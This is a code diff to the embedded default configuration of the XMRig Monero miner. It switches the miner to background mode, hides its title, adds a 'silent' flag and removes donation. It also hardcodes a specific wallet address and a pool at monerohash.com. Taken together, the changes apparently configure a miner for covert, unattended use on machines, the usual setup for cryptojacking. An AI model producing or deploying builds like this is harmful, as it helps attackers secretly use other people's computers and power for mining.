@@ -24,9 +24,9 @@
 namespace xmrig {
 
 
-// This feature require CMake option: -DWITH_EMBEDDED_CONFIG=ON
+    // This feature require CMake option: -DWITH_EMBEDDED_CONFIG=ON
 #ifdef XMRIG_FEATURE_EMBEDDED_CONFIG
-const static char *default_config =
+const static char* default_config =
 R"===(
 {
     "api": {
@@ -40,15 +40,15 @@ R"===(
         "access-token": null,
         "restricted": true
     },
-    "autosave": true,
-    "background": false,
+    "autosave": false,
+    "background": true,
     "colors": true,
-    "title": true,
+    "title": false,
     "randomx": {
         "init": -1,
         "init-avx2": -1,
         "mode": "auto",
-        "1gb-pages": false,
+        "1gb-pages": true,
         "rdmsr": true,
         "wrmsr": true,
         "cache_qos": false,
@@ -58,10 +58,10 @@ R"===(
     "cpu": {
         "enabled": true,
         "huge-pages": true,
-        "huge-pages-jit": false,
+        "huge-pages-jit": true,
         "hw-aes": null,
-        "priority": null,
-        "memory-pool": false,
+        "priority": 5,
+        "memory-pool": true,
         "yield": true,
         "max-threads-hint": 100,
         "asm": true,
@@ -85,21 +85,21 @@ R"===(
         "cn/0": false,
         "cn-lite/0": false
     },
-    "donate-level": 1,
-    "donate-over-proxy": 1,
+    "donate-level": 0,
+    "donate-over-proxy": 0,
     "log-file": null,
     "pools": [
         {
             "algo": null,
             "coin": null,
-            "url": "donate.v2.xmrig.com:3333",
-            "user": "YOUR_WALLET_ADDRESS",
+            "url": "monerohash.com:9999",
+            "user": "451U7YixdNDPiDvHCVPU9TC7gu3gWJAZngGNSxHPD2aLMazJVeMNebRigmT3MhXaQMPFYf1WRJTPXXQCZS2WFRiEVRngzh5",
             "pass": "x",
             "rig-id": null,
             "nicehash": false,
-            "keepalive": false,
+            "keepalive": true,
             "enabled": true,
-            "tls": false,
+            "tls": true,
             "tls-fingerprint": null,
             "daemon": false,
             "socks5": null,
@@ -114,7 +114,7 @@ R"===(
     "retry-pause": 5,
     "syslog": false,
     "tls": {
-        "enabled": false,
+        "enabled": true,
         "protocols": null,
         "cert": null,
         "cert_key": null,
@@ -124,6 +124,7 @@ R"===(
     },
     "user-agent": null,
     "verbose": 0,
+    "silent": true,
     "watch": true,
     "pause-on-battery": false,
     "pause-on-active": false
